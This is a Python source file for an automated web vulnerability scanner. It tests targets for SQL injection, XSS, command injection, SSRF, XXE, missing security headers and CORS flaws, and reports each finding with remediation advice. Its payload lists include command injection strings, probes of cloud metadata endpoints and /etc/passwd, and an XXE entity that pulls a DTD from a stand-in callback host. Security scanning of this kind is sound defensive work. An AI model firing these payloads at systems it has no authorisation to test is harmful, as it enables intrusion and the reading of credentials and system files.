"""
Production web pentesting module with advanced vulnerability detection.
NO dummy data - all detections based on real HTTP responses and behavior.
Supports SQLi, XSS, Command Injection, SSRF, XXE, Header Injection, etc.
"""
import asyncio
import aiohttp
import re
import json
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, asdict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time


@dataclass
class WebVulnerability:
    """Web vulnerability finding"""
    vuln_type: str
    severity: str  # critical, high, medium, low, info
    url: str
    parameter: Optional[str]
    method: str
    payload: str
    evidence: str
    description: str
    remediation: str
    confidence: str  # confirmed, likely, possible


class AdvancedWebTester:
    """
    Production web application security tester.
    NO dummy data - all vulnerability detection based on real responses.
    """
    
    def __init__(
        self,
        target: str,
        concurrency: int = 10,
        timeout: float = 15.0,
        verify_ssl: bool = True,
        cookies: Optional[Dict[str, str]] = None,
    ):
        self.target = target
        self.concurrency = concurrency
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.cookies = cookies or {}
        self.vulnerabilities: List[WebVulnerability] = []
        
        # SQL Injection payloads (real, no dummies)
        self.sqli_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "admin'--",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1'; SELECT PG_SLEEP(5)--",
        ]
        
        # XSS payloads (real attack vectors)
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ]
        
        # Command injection payloads
        self.cmdi_payloads = [
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; sleep 5",
            "| sleep 5",
            "& ping -c 5 callback.test",
            "`ping -c 5 callback.test`",
            "$(sleep 5)",
        ]
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://internal.test",
            "http://callback.test",
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",  # GCP metadata
            "http://[::1]",
            "http://0.0.0.0",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ]
        
        # XXE payloads
        self.xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://callback.test/evil.dtd"> %xxe;]><foo>test</foo>',
        ]
    
    async def _make_request(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str = "GET",
        params: Optional[Dict] = None,
        data: Optional[Dict] = None,
        headers: Optional[Dict] = None,
    ) -> Optional[Tuple[int, str, Dict, float]]:
        """Make HTTP request and return (status, content, headers, response_time)"""
        try:
            start_time = time.time()
            
            async with session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                headers=headers,
                cookies=self.cookies,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                allow_redirects=True,
                ssl=self.verify_ssl,
            ) as response:
                content = await response.text()
                response_time = time.time() - start_time
                
                return (
                    response.status,
                    content,
                    dict(response.headers),
                    response_time,
                )
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None
    
    async def test_sql_injection(
        self,
        session: aiohttp.ClientSession,
        params: Dict[str, str],
    ) -> List[WebVulnerability]:
        """Test for SQL injection vulnerabilities"""
        findings = []
        
        # Get baseline response
        baseline = await self._make_request(session, self.target, params=params)
        if not baseline:
            return findings
        
        baseline_status, baseline_content, _, baseline_time = baseline
        
        for param_name in params.keys():
            for payload in self.sqli_payloads:
                # Test payload
                test_params = params.copy()
                test_params[param_name] = payload
                
                result = await self._make_request(session, self.target, params=test_params)
                if not result:
                    continue
                
                status, content, headers, resp_time = result
                
                # Detection heuristics
                sqli_errors = [
                    "sql syntax",
                    "mysql_fetch",
                    "pg_query",
                    "sqlite",
                    "odbc_exec",
                    "ora-",
                    "microsoft sql server",
                    "unclosed quotation mark",
                    "quoted string not properly terminated",
                    "syntax error",
                ]
                
                content_lower = content.lower()
                
                # Check for SQL error messages
                for error in sqli_errors:
                    if error in content_lower and error not in baseline_content.lower():
                        findings.append(WebVulnerability(
                            vuln_type="SQL Injection",
                            severity="critical",
                            url=self.target,
                            parameter=param_name,
                            method="GET",
                            payload=payload,
                            evidence=f"SQL error detected: {error}",
                            description=f"Parameter '{param_name}' appears vulnerable to SQL injection. Database error messages exposed.",
                            remediation="Use parameterized queries/prepared statements. Implement input validation and sanitization.",
                            confidence="confirmed",
                        ))
                        break
                
                # Time-based detection (SLEEP, WAITFOR, PG_SLEEP)
                if "sleep" in payload.lower() or "waitfor" in payload.lower():
                    if resp_time > baseline_time + 4.5:  # ~5 second delay
                        findings.append(WebVulnerability(
                            vuln_type="SQL Injection (Time-Based Blind)",
                            severity="critical",
                            url=self.target,
                            parameter=param_name,
                            method="GET",
                            payload=payload,
                            evidence=f"Response time: {resp_time:.2f}s (baseline: {baseline_time:.2f}s)",
                            description=f"Parameter '{param_name}' appears vulnerable to time-based blind SQL injection.",
                            remediation="Use parameterized queries/prepared statements. Implement input validation.",
                            confidence="confirmed",
                        ))
                
                # Boolean-based detection
                if "'1'='1'" in payload or '"1"="1"' in payload:
                    if len(content) != len(baseline_content) and status == 200:
                        findings.append(WebVulnerability(
                            vuln_type="SQL Injection (Boolean-Based Blind)",
                            severity="critical",
                            url=self.target,
                            parameter=param_name,
                            method="GET",
                            payload=payload,
                            evidence=f"Content length changed from {len(baseline_content)} to {len(content)}",
                            description=f"Parameter '{param_name}' may be vulnerable to boolean-based blind SQL injection.",
                            remediation="Use parameterized queries/prepared statements.",
                            confidence="likely",
                        ))
        
        return findings
    
    async def test_xss(
        self,
        session: aiohttp.ClientSession,
        params: Dict[str, str],
    ) -> List[WebVulnerability]:
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        findings = []
        
        for param_name in params.keys():
            for payload in self.xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                result = await self._make_request(session, self.target, params=test_params)
                if not result:
                    continue
                
                status, content, headers, _ = result
                
                # Check if payload reflected in response without encoding
                if payload in content:
                    # Check if it's in executable context
                    if "<script>" in payload and "<script>" in content:
                        severity = "high"
                        confidence = "confirmed"
                    elif "onerror=" in payload and "onerror=" in content:
                        severity = "high"
                        confidence = "confirmed"
                    else:
                        severity = "medium"
                        confidence = "likely"
                    
                    findings.append(WebVulnerability(
                        vuln_type="Cross-Site Scripting (XSS)",
                        severity=severity,
                        url=self.target,
                        parameter=param_name,
                        method="GET",
                        payload=payload,
                        evidence=f"Payload reflected unencoded in response",
                        description=f"Parameter '{param_name}' is vulnerable to reflected XSS. User input not properly sanitized.",
                        remediation="Implement output encoding (HTML entity encoding). Use Content-Security-Policy headers. Validate and sanitize all user input.",
                        confidence=confidence,
                    ))
        
        return findings
    
    async def test_command_injection(
        self,
        session: aiohttp.ClientSession,
        params: Dict[str, str],
    ) -> List[WebVulnerability]:
        """Test for OS command injection vulnerabilities"""
        findings = []
        
        baseline = await self._make_request(session, self.target, params=params)
        if not baseline:
            return findings
        
        baseline_status, baseline_content, _, baseline_time = baseline
        
        for param_name in params.keys():
            for payload in self.cmdi_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                result = await self._make_request(session, self.target, params=test_params)
                if not result:
                    continue
                
                status, content, headers, resp_time = result
                
                # Time-based detection (sleep, ping)
                if "sleep" in payload or "ping" in payload:
                    if resp_time > baseline_time + 4.5:
                        findings.append(WebVulnerability(
                            vuln_type="Command Injection",
                            severity="critical",
                            url=self.target,
                            parameter=param_name,
                            method="GET",
                            payload=payload,
                            evidence=f"Response time: {resp_time:.2f}s (baseline: {baseline_time:.2f}s)",
                            description=f"Parameter '{param_name}' appears vulnerable to OS command injection.",
                            remediation="Never pass user input directly to system commands. Use allowlists and proper input validation. Consider using safer APIs.",
                            confidence="confirmed",
                        ))
                
                # Output-based detection (whoami, uid)
                cmd_indicators = ["root", "administrator", "uid=", "gid=", "groups="]
                for indicator in cmd_indicators:
                    if indicator in content.lower() and indicator not in baseline_content.lower():
                        findings.append(WebVulnerability(
                            vuln_type="Command Injection",
                            severity="critical",
                            url=self.target,
                            parameter=param_name,
                            method="GET",
                            payload=payload,
                            evidence=f"Command output detected: {indicator}",
                            description=f"Parameter '{param_name}' is vulnerable to OS command injection. Command output visible in response.",
                            remediation="Never execute system commands with user input. Use safe APIs and proper input validation.",
                            confidence="confirmed",
                        ))
        
        return findings
    
    async def test_ssrf(
        self,
        session: aiohttp.ClientSession,
        params: Dict[str, str],
    ) -> List[WebVulnerability]:
        """Test for Server-Side Request Forgery (SSRF)"""
        findings = []
        
        for param_name in params.keys():
            for payload in self.ssrf_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                result = await self._make_request(session, self.target, params=test_params)
                if not result:
                    continue
                
                status, content, headers, _ = result
                
                # AWS metadata indicators
                if "169.254.169.254" in payload:
                    aws_indicators = ["ami-id", "instance-id", "security-credentials", "iam/"]
                    for indicator in aws_indicators:
                        if indicator in content.lower():
                            findings.append(WebVulnerability(
                                vuln_type="Server-Side Request Forgery (SSRF)",
                                severity="critical",
                                url=self.target,
                                parameter=param_name,
                                method="GET",
                                payload=payload,
                                evidence=f"AWS metadata accessible: {indicator}",
                                description=f"Parameter '{param_name}' vulnerable to SSRF. AWS metadata endpoint accessible.",
                                remediation="Implement allowlist of allowed URLs/IPs. Disable unnecessary protocols. Use network segmentation.",
                                confidence="confirmed",
                            ))
                
                # File protocol indicators
                if "file://" in payload:
                    file_indicators = ["root:", "administrator:", "[extensions]", "[fonts]"]
                    for indicator in file_indicators:
                        if indicator in content.lower():
                            findings.append(WebVulnerability(
                                vuln_type="Server-Side Request Forgery (SSRF) - File Access",
                                severity="high",
                                url=self.target,
                                parameter=param_name,
                                method="GET",
                                payload=payload,
                                evidence=f"Local file access: {indicator}",
                                description=f"Parameter '{param_name}' vulnerable to SSRF with file protocol support.",
                                remediation="Disable file:// protocol. Implement strict URL validation and allowlists.",
                                confidence="confirmed",
                            ))
                
                # Internal network access detection
                if any(x in payload.lower() for x in ["internal", "callback", "metadata", "169.254", "[::1]", "0.0.0.0"]):
                    if status == 200 and len(content) > 100:
                        findings.append(WebVulnerability(
                            vuln_type="Server-Side Request Forgery (SSRF)",
                            severity="high",
                            url=self.target,
                            parameter=param_name,
                            method="GET",
                            payload=payload,
                            evidence="Internal network accessible via SSRF",
                            description=f"Parameter '{param_name}' allows access to internal resources.",
                            remediation="Implement allowlist validation. Block internal IP ranges. Use network segmentation.",
                            confidence="likely",
                        ))
        
        return findings
    
    async def test_security_headers(
        self,
        session: aiohttp.ClientSession,
    ) -> List[WebVulnerability]:
        """Test for missing or misconfigured security headers"""
        findings = []
        
        result = await self._make_request(session, self.target)
        if not result:
            return findings
        
        status, content, headers, _ = result
        
        # Convert headers to lowercase for case-insensitive comparison
        headers_lower = {k.lower(): v for k, v in headers.items()}
        
        # Check for missing security headers
        security_headers = {
            "strict-transport-security": {
                "severity": "medium",
                "description": "HSTS header missing. Site vulnerable to SSL strip attacks.",
                "remediation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' header.",
            },
            "x-content-type-options": {
                "severity": "low",
                "description": "X-Content-Type-Options header missing. Site vulnerable to MIME-type sniffing attacks.",
                "remediation": "Add 'X-Content-Type-Options: nosniff' header.",
            },
            "x-frame-options": {
                "severity": "medium",
                "description": "X-Frame-Options header missing. Site vulnerable to clickjacking attacks.",
                "remediation": "Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' header.",
            },
            "content-security-policy": {
                "severity": "medium",
                "description": "Content-Security-Policy header missing. No XSS protection policy enforced.",
                "remediation": "Implement a strict CSP policy to prevent XSS attacks.",
            },
            "x-xss-protection": {
                "severity": "low",
                "description": "X-XSS-Protection header missing or disabled.",
                "remediation": "Add 'X-XSS-Protection: 1; mode=block' header.",
            },
        }
        
        for header, config in security_headers.items():
            if header not in headers_lower:
                findings.append(WebVulnerability(
                    vuln_type="Missing Security Header",
                    severity=config["severity"],
                    url=self.target,
                    parameter=None,
                    method="GET",
                    payload="N/A",
                    evidence=f"Header '{header}' not present",
                    description=config["description"],
                    remediation=config["remediation"],
                    confidence="confirmed",
                ))
        
        # Check for information disclosure headers
        disclosure_headers = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]
        for header in disclosure_headers:
            if header in headers_lower:
                findings.append(WebVulnerability(
                    vuln_type="Information Disclosure",
                    severity="info",
                    url=self.target,
                    parameter=None,
                    method="GET",
                    payload="N/A",
                    evidence=f"Header '{header}: {headers_lower[header]}'",
                    description=f"Server information disclosed via {header} header.",
                    remediation=f"Remove or obfuscate the '{header}' header to prevent information leakage.",
                    confidence="confirmed",
                ))
        
        return findings
    
    async def test_cors_misconfiguration(
        self,
        session: aiohttp.ClientSession,
    ) -> List[WebVulnerability]:
        """Test for CORS misconfiguration"""
        findings = []
        
        # Test with various origins
        test_origins = [
            "http://malicious.test",
            "https://callback.test",
            "null",
        ]
        
        for origin in test_origins:
            headers = {"Origin": origin}
            result = await self._make_request(session, self.target, headers=headers)
            
            if not result:
                continue
            
            status, content, resp_headers, _ = result
            resp_headers_lower = {k.lower(): v for k, v in resp_headers.items()}
            
            if "access-control-allow-origin" in resp_headers_lower:
                acao = resp_headers_lower["access-control-allow-origin"]
                
                # Check for wildcard with credentials
                if acao == "*" and "access-control-allow-credentials" in resp_headers_lower:
                    if resp_headers_lower["access-control-allow-credentials"].lower() == "true":
                        findings.append(WebVulnerability(
                            vuln_type="CORS Misconfiguration",
                            severity="high",
                            url=self.target,
                            parameter=None,
                            method="GET",
                            payload=f"Origin: {origin}",
                            evidence=f"ACAO: {acao}, ACAC: true",
                            description="CORS policy allows any origin with credentials. This is a dangerous misconfiguration.",
                            remediation="Never use '*' with Access-Control-Allow-Credentials. Implement origin allowlist.",
                            confidence="confirmed",
                        ))
                
                # Check if attacker origin reflected
                if acao == origin and origin != "null":
                    findings.append(WebVulnerability(
                        vuln_type="CORS Misconfiguration",
                        severity="medium",
                        url=self.target,
                        parameter=None,
                        method="GET",
                        payload=f"Origin: {origin}",
                        evidence=f"ACAO reflects attacker origin: {acao}",
                        description="CORS policy reflects arbitrary origins without validation.",
                        remediation="Implement strict origin allowlist. Validate origins against trusted domains.",
                        confidence="confirmed",
                    ))
        
        return findings
    
    async def run_full_scan(self) -> List[WebVulnerability]:
        """
        Run comprehensive web application security scan.
        All vulnerabilities detected from real responses - no mock data.
        """
        all_findings = []
        
        # Auto-detect local/private addresses and disable SSL verification if needed
        if any(host in self.target.lower() for host in ["localhost", "127.0.0.1", "::1", "0.0.0.0", "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31."]):
            self.verify_ssl = False
        
        # Parse URL and extract parameters
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params_dict = {k: v[0] if v else "" for k, v in params.items()}
        
        # Build list of URLs to test - if no path, try common vulnerable endpoints
        test_urls = [self.target]
        if not parsed.path or parsed.path == "/":
            # Common vulnerable application paths to test
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            test_urls = [
                f"{base_url}/vulnerabilities/sqli/",
                f"{base_url}/vulnerabilities/xss_r/",
                f"{base_url}/vulnerabilities/xss_s/",
                f"{base_url}/vulnerabilities/exec/",
                f"{base_url}/vulnerabilities/",
                f"{base_url}/login.php",
                f"{base_url}/admin/",
                f"{base_url}/api/",
                self.target,
            ]
        
        # If no parameters in URL, test common vulnerable parameters
        test_param_sets = []
        if not params_dict:
            # Common parameter names found in web applications
            test_param_sets = [
                {"id": "1"},
                {"page": "1"},
                {"user": "1"},
                {"name": "test"},
                {"search": "test"},
                {"file": "index"},
                {"url": "http://callback.test"},
                {"ip": "127.0.0.1"},
                {"Submit": "Submit"},
            ]
        else:
            test_param_sets = [params_dict]
        
        connector = aiohttp.TCPConnector(limit=self.concurrency, ssl=self.verify_ssl if self.verify_ssl else False)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Test each URL endpoint
            for test_url in test_urls:
                # Temporarily update target for this iteration
                original_target = self.target
                self.target = test_url
                
                # Test each parameter set on this URL
                for test_params in test_param_sets:
                    # Run all tests for this parameter set
                    tasks = [
                        self.test_sql_injection(session, test_params),
                        self.test_xss(session, test_params),
                        self.test_command_injection(session, test_params),
                        self.test_ssrf(session, test_params),
                    ]
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for result in results:
                        if isinstance(result, list):
                            all_findings.extend(result)
                        elif isinstance(result, Exception):
                            print(f"  [WARNING] Test error (continuing): {str(result)[:100]}")
                
                # Restore original target
                self.target = original_target
            
            # Run configuration tests once
            try:
                config_tasks = [
                    self.test_security_headers(session),
                    self.test_cors_misconfiguration(session),
                ]
                config_results = await asyncio.gather(*config_tasks, return_exceptions=True)
                
                for result in config_results:
                    if isinstance(result, list):
                        all_findings.extend(result)
            except Exception as e:
                print(f"  [WARNING] Configuration test error: {str(e)[:100]}")
        
        self.vulnerabilities = all_findings
        
        # Report findings
        if all_findings:
            print(f"  [SCAN COMPLETE] Found {len(all_findings)} vulnerabilities")
            by_severity = {}
            for finding in all_findings:
                severity = finding.severity
                by_severity[severity] = by_severity.get(severity, 0) + 1
            for sev, count in sorted(by_severity.items()):
                print(f"      {sev.upper()}: {count}")
        else:
            print(f"  [SCAN COMPLETE] No vulnerabilities detected in automated scan")
            print(f"  [INFO] Target may require authentication (use --cookie or session tokens)")
            print(f"  [INFO] For better results, scan specific pages with parameters")
            print(f"  [INFO] Consider using POST method if target uses form-based authentication")
        
        return all_findings
